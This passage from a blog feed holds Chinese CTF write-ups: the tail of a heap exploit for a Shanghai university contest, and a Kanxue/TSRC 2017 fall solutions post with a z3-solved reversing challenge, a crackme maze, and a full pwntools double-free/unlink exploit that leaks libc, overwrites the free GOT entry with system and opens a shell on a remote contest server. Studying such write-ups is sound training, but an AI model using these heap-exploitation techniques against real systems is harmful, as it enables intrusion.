class="number">0x04007A0</span>)+p64(<span class="number">0x603030</span>)+p64(<span class="number">8</span>)</span><br><span class="line">    edit2(<span class="number">101</span>,<span class="number">112</span>,pl2)</span><br><span class="line">    dbg(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    show(<span class="string">&#x27;102&#x27;</span>)</span><br><span class="line">    data=jsn(<span class="number">7</span>)[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">    data=u64(data.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_addr=data<span class="number">-0x3c48e0</span></span><br><span class="line">    mark(<span class="string">&#x27;libc_addr&#x27;</span>,hex(libc_addr))</span><br><span class="line">    <span class="comment">#malloc_hook=0x3c4b10+libc_addr</span></span><br><span class="line">    <span class="comment">#mark(&#x27;malloc_hook&#x27;,hex(malloc_hook))</span></span><br><span class="line">    one_gadgets=<span class="number">0x4526A</span>+libc_addr </span><br><span class="line">    mark(<span class="string">&#x27;one_gadgets&#x27;</span>,hex(one_gadgets))</span><br><span class="line">    </span><br><span class="line">    sh_addr=libc_addr+<span class="number">0x18CD17</span></span><br><span class="line">    system_addr=libc_addr+<span class="number">0x45390</span></span><br><span class="line">    add(<span class="number">40</span>,<span class="number">40</span>)<span class="comment">#103</span></span><br><span class="line">    add(<span class="number">40</span>,<span class="number">40</span>)<span class="comment">#104</span></span><br><span class="line">    pl3=<span class="number">72</span>*<span class="string">&#x27;c&#x27;</span>+p64(sh_addr)+p64(<span class="number">0x330e9</span>)+p64(system_addr)+p64(<span class="number">0x603000</span>)+p64(<span class="number">8</span>)</span><br><span class="line">    edit2(<span class="number">103</span>,<span class="number">112</span>,pl3)</span><br><span class="line">    dbg(<span class="string">&#x27;shell&#x27;</span>)</span><br><span class="line">    show(<span class="string">&#x27;104&#x27;</span>)</span><br><span class="line">    shell()</span><br></pre></td></tr></table></figure><h1 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h1><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/11091834.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/11091834.jpg"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三届上海市大学生网络安全大赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>看雪.TSRC 2017CTF秋季赛　</title>
      <link href="2017-Kanxue-TSRC-fall-race.html"/>
      <url>2017-Kanxue-TSRC-fall-race.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>看雪的ctf  以逆向和pwn为主，持续更新，希望能跟下去把</p><h2 id="第一题-Helllo-CTF"><a href="#第一题-Helllo-CTF" class="headerlink" title="第一题 Helllo-CTF"></a>第一题 Helllo-CTF</h2><p>明文，不详解</p><h2 id="第二题-ctf2017-Fpc"><a href="#第二题-ctf2017-Fpc" class="headerlink" title="第二题 ctf2017_Fpc"></a>第二题 ctf2017_Fpc</h2><p>讲道理第二题出得很没有道理，<br>输入后的两个call 并没有什么用  干扰视线</p><p>在text段有一段shellcode，构造<code>9876543210ab11A</code>的输入可以跳转到该shellcode上，这是一段很花很花的东西</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-ctf2018_fpc-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-ctf2018_fpc-01.jpg"></a></p><p>跳转不看，我们将有用的汇编取出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">00413150 | 33 C0                    | xor eax,eax                             |</span><br><span class="line">00413184 | A3 34 B0 41 00           | mov dword ptr ds:[41B034],eax           |</span><br><span class="line">004131BA | 58                       | pop eax                                 |  x    ecx</span><br><span class="line">004131EB | 8B C8                    | mov ecx,eax                             |  x    </span><br><span class="line">0041321F | 58                       | pop eax                                 |  y    ebx</span><br><span class="line">00413254 | 8B D8                    | mov ebx,eax                             |  y</span><br><span class="line">00413289 | 58                       | pop eax                                 |  z    edx</span><br><span class="line">004132B5 | 8B D0                    | mov edx,eax                             |  z </span><br><span class="line">004132AD | 8B D0                    | mov edx,eax                             |</span><br><span class="line"></span><br><span class="line">004132E2 | 8B C1                    | mov eax,ecx                             |  eax &#x3D; ecx &#x3D; x</span><br><span class="line">00413316 | 2B C3                    | sub eax,ebx                             |  eax &#x3D; eax-ecx &#x3D; x-y</span><br><span class="line">00413349 | C1 E0 02                 | shl eax,2                               |  eax &#x3D; (x-y)&lt;&lt;2</span><br><span class="line">00413380 | 03 C1                    | add eax,ecx                             |  eax &#x3D; ((x-y)&lt;&lt;2)+ x</span><br><span class="line">004133B5 | 03 C2                    | add eax,edx                             |  eax &#x3D; ((x-y)&lt;&lt;2)+ x+z</span><br><span class="line">004133E9 | 2D E2 17 F9 EA           | sub eax,EAF917E2                        |  eax &#x3D; ((x-y)&lt;&lt;2)+ x+z-0xEAF917E2</span><br><span class="line"></span><br><span class="line">00413455    03C1            ADD EAX,ECX</span><br><span class="line">00413489    2BC3            SUB EAX,EBX                              ; EAX&#x3D;EAX-EBX&#x3D;x-y</span><br><span class="line">004134BF    8BD8            MOV EBX,EAX                              ; EBX&#x3D;x-y</span><br><span class="line">004134F3    D1E0            SHL EAX,1                                ; EAX&#x3D;  (x-y)&lt;&lt;1</span><br><span class="line">00413525    03C3            ADD EAX,EBX                              ; EAX&#x3D;EAX+EBX&#x3D; ((x-y)&lt;&lt;1)+(x-y)</span><br><span class="line">00413559    03C1            ADD EAX,ECX                              ; EAX&#x3D; ((x-y)&lt;&lt;1)+(x-y)+x</span><br><span class="line">0041358F    8BC8            MOV ECX,EAX                              ; ECX&#x3D;EAX</span><br><span class="line">004135C3    03C2            ADD EAX,EDX                              ; EAX&#x3D;   ((x-y)&lt;&lt;1)+(x-y)+x+z</span><br><span class="line">004135F7    2D C808F5E8     SUB EAX,0xE8F508C8                       ; EAX&#x3D;   ((x-y)&lt;&lt;1)+(x-y)-0xE8F508C8</span><br><span class="line">00413665    8BC1            MOV EAX,ECX                              ; EAX&#x3D;   ((x-y)&lt;&lt;1)+(x-y)+x</span><br><span class="line">0041365D    8BC1            MOV EAX,ECX                              ; </span><br><span class="line">004136A7    2BC2            SUB EAX,EDX                              ; EAX&#x3D; EAX-EDX&#x3D;((x-y)&lt;&lt;1)+(x-y)+x-z</span><br><span class="line"></span><br><span class="line">esp:</span><br><span class="line">0018FF48   00413835  ASCII &quot;You get it!&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后可以获取三个算式<br>我们使用z3求解</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ cat solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x, y ,z = BitVecs(<span class="string">&#x27;x y z&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"><span class="comment">#x = Real(&#x27;x&#x27;)</span></span><br><span class="line"><span class="comment">#y = Real(&#x27;y&#x27;)</span></span><br><span class="line"><span class="comment">#z = Real(&#x27;z&#x27;)</span></span><br><span class="line"></span><br><span class="line">solve(((x - y) &lt;&lt; <span class="number">2</span>) + x + z == <span class="number">0xEAF917E2</span>,((x - y) &lt;&lt; <span class="number">1</span>) + (x - y) + x + z == <span class="number">0xE8F508C8</span>,((x - y) &lt;&lt; <span class="number">1</span>) + (x - y) + x - z == <span class="number">0x0C0A3C68</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in /private/tmp [21:32:21]</span></span><br><span class="line">$ python solve.py</span><br><span class="line">[z = <span class="number">1853187632</span>, y = <span class="number">1919903280</span>, x = <span class="number">1953723722</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag: Just0for0fun11A</p><h2 id="第三题-crackMe"><a href="#第三题-crackMe" class="headerlink" title="第三题 crackMe"></a>第三题 crackMe</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-01.jpg"></a></p><p>运行程序，能看到是有gui的，查找import </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-kanxue-crackme-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-kanxue-crackme-02.jpg"></a></p><p>能找到<code>GetDlgItemTextA</code>这个是一个处理窗口消息的函数</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-03.jpg"></a></p><p>我们通过交叉引用，可以找到程序的关键流程</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-05.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-05.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-06.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-06.jpg"></a></p><p>基本的流程就是：读取用户收入信息。然后做两次base64编码，再用国密算法SM3计算一个hash。计算完hash之后转换成16进制。然后将Hash值的后64位和用户输入进行比较。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-07.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-07.jpg"></a></p><p>然后程序的下一个流程 会到一个迷宫游戏</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-09.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-09.jpg"></a></p><p>能看到迷宫地图</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0 1 1 1 1 1 1 1 1 0</span><br><span class="line">0 0 1 1 1 1 1 0 0 0</span><br><span class="line">1 0 0 0 0 0 1 0 1 1</span><br><span class="line">1 1 1 1 1 0 1 0 0 1</span><br><span class="line">1 0 0 0 1 0 1 0 0 1</span><br><span class="line">1 0 1 0 0 0 1 0 1 1</span><br><span class="line">1 0 1 1 1 1 1 0 0 1</span><br><span class="line">1 0 0 0 0 1 1 1 0 0</span><br><span class="line">1 1 1 1 0 0 0 0 1 0</span><br><span class="line">1 1 1 1 1 1 1 0 0 0</span><br></pre></td></tr></table></figure><p>其中的0为可行路径。题目中，替换后的输入字符为q z分别表示向上一行和向下一行；p l分别表示向左一格和向右一格。<br>[3,8]为死路。若输入为\x20，则结束，返回True；若走错，则返回False，验证失败。<br>这里并没有对路径完成量进行约束，也产生了多解可能。这里，我们为简化，可以直接让替换后的第一个字符为\x20。</p><p>总是所述，正确的答案行走路线是：<br>zlzllllzzzppqppzzzlllzlllzllqqpqpqqqqqllq<br>然后根据上面分析到的结果进行逆运算。它的摩尔斯码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--.. .-.. --.. .-.. .-.. .-.. .-.. --.. --.. --.. .--. .--. --.- .--. .--. --.. --.. --.. .-.. .-.. .-.. --.. .-.. .-.. .-.. --.. .-.. .-.. --.- --.- .--. --.- .--. --.- --.- --.- --.- --.- .-.. .-.. --.-&#x2F;</span><br></pre></td></tr></table></figure><p>将上述结果进行2次base64编码<br>最后在末尾附加hash值（就是SM3加密之后的值）就是答案</p><h2 id="第四题-club-pwn"><a href="#第四题-club-pwn" class="headerlink" title="第四题 club_pwn"></a>第四题 club_pwn</h2><p>double free<br>我的简单分析 <a href="https://bbs.pediy.com/thread-222421.htm">https://bbs.pediy.com/thread-222421.htm</a></p><p>exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal =[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt;<span class="number">1</span>:</span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">libc= CDLL(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">lib = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;club&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">libc = CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">lib = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;123.206.22.95&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#main_arena_offset = lib.symbols[&#x27;main_arena&#x27;]</span></span><br><span class="line">system_offset = lib.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_offset = lib.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line">free_offset = lib.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;system_offset:0x%x&quot;</span> % system_offset)</span><br><span class="line">log.info(<span class="string">&quot;binsh_offset:0x%x&quot;</span> % binsh_offset)</span><br><span class="line">log.info(<span class="string">&quot;free_offset: 0x%X&quot;</span> % free_offset)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_a_box</span>(<span class="params">index,size</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(<span class="string">&#x27;1&#x27;</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(index))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destory_a_box</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(<span class="string">&#x27;2&#x27;</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_me_a_message</span>(<span class="params">index,message</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(<span class="string">&#x27;3&#x27;</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(index))</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_message</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(<span class="string">&#x27;4&#x27;</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_a_randnum</span>(<span class="params">num</span>):</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(<span class="string">&#x27;5&#x27;</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_seed</span>(<span class="params">num</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0x148</span>,<span class="number">0x7ffff000</span>,<span class="number">0x1000</span>):</span><br><span class="line"><span class="comment">#i = i&lt;&lt;12</span></span><br><span class="line"><span class="comment">#i += 0x148 #seed offset</span></span><br><span class="line">libc.srand(i)</span><br><span class="line">randnum = int(libc.rand())</span><br><span class="line"><span class="keyword">if</span> randnum == int(num):</span><br><span class="line"><span class="keyword">return</span> libc.rand()</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;seed&#x27;</span> ,i</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">guess_a_randnum(str(<span class="number">0</span>))</span><br><span class="line">n = io.recvuntil(<span class="string">&#x27;is &#x27;</span>)</span><br><span class="line">num = io.recvuntil(<span class="string">&#x27;!&#x27;</span>)[:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;[*]rand1=&#x27;</span>+num</span><br><span class="line"></span><br><span class="line"><span class="comment"># get seed addr and base addr</span></span><br><span class="line"></span><br><span class="line">a=guess_seed(num)</span><br><span class="line"></span><br><span class="line">guess_a_randnum(a)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;You get a secret:&#x27;</span>)</span><br><span class="line">seed_addr = int(io.recvuntil(<span class="string">&#x27;!&#x27;</span>)[:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;seed_addr: 0x%x&quot;</span> % int(seed_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_got_addr = seed_addr<span class="number">-0x202148</span>+<span class="number">0x202018</span></span><br><span class="line">p_addr = seed_addr<span class="number">-0x202148</span>+<span class="number">0x202110</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;free_got_addr:&#x27;</span>+hex(free_got_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake chunk and get shell</span></span><br><span class="line"></span><br><span class="line">fake_fd = p64(p_addr<span class="number">-0x18</span>)</span><br><span class="line">fake_bk = p64(p_addr<span class="number">-0x10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_a_box(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">get_a_box(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">get_a_box(<span class="number">3</span>,<span class="number">0x110</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;get 3 box&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">raw_input(<span class="string">&#x27;destory_2_box&#x27;</span>)</span><br><span class="line">destory_a_box(<span class="number">2</span>)</span><br><span class="line">destory_a_box(<span class="number">3</span>)</span><br><span class="line">pause()</span><br><span class="line">fake_fd = p64(p_addr<span class="number">-0x18</span>)</span><br><span class="line">fake_bk = p64(p_addr<span class="number">-0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+fake_fd+fake_bk+<span class="string">&#x27;A&#x27;</span>*(<span class="number">0x100</span><span class="number">-0x20</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x220</span><span class="number">-0x100</span>) </span><br><span class="line">raw_input(<span class="string">&#x27;off by one to leak &#x27;</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;get 4 box size 0x220&#x27;</span>)</span><br><span class="line">get_a_box(<span class="number">4</span>,<span class="number">0x220</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;fill the 4 box&#x27;</span>)</span><br><span class="line">leave_me_a_message(<span class="number">4</span>,payload)</span><br><span class="line">raw_input(<span class="string">&#x27;destory_3_box&#x27;</span>)</span><br><span class="line">destory_a_box(<span class="number">3</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;leak got addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;leaking address...&#x27;</span>)</span><br><span class="line">leave_me_a_message(<span class="number">2</span>,p64(<span class="number">1</span>)+p64(<span class="number">1</span>)+p64(free_got_addr))</span><br><span class="line">raw_input(<span class="string">&#x27;leakk.......&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">raw_input(<span class="string">&#x27;leak free addr&#x27;</span>)</span><br><span class="line">show_message(<span class="number">1</span>)</span><br><span class="line">pause()</span><br><span class="line">free_addr = u64(io.recvuntil(<span class="string">&#x27;You have 6 operation :&#x27;</span>)[<span class="number">1</span>:<span class="number">7</span>]+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">system_addr = int(free_addr)-free_offset+system_offset</span><br><span class="line">log.info(<span class="string">&#x27;system address:&#x27;</span>+hex(system_addr))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">raw_input(<span class="string">&#x27;get shell~~~~~~&#x27;</span>)</span><br><span class="line">leave_me_a_message(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">pause()</span><br><span class="line">leave_me_a_message(<span class="number">3</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;unlink to get shell&#x27;</span>)</span><br><span class="line">destory_a_box(<span class="number">3</span>)   </span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># log.info(&quot;leak .....libc.....&quot;)</span></span><br><span class="line"><span class="comment"># get_a_box(1,0x80)</span></span><br><span class="line"><span class="comment"># get_a_box(2,0xa0)</span></span><br><span class="line"><span class="comment"># get_a_box(3,0xb0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># destory_a_box(2)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># #gdb.attach(io)</span></span><br><span class="line"><span class="comment"># raw_input(&#x27;leak.....libc&#x27;)</span></span><br><span class="line"><span class="comment"># show_message(2)</span></span><br><span class="line"><span class="comment"># main_arena_addr = u64(io.recvuntil(&#x27;You have 6 operation :&#x27;)[1:7]+&#x27;\x00&#x27;*2)</span></span><br><span class="line"><span class="comment"># print hex(main_arena_addr)</span></span><br><span class="line"><span class="comment"># #log.info(&quot;main_arena_addr: 0x%x&quot; % hex(main_arena_addr))</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
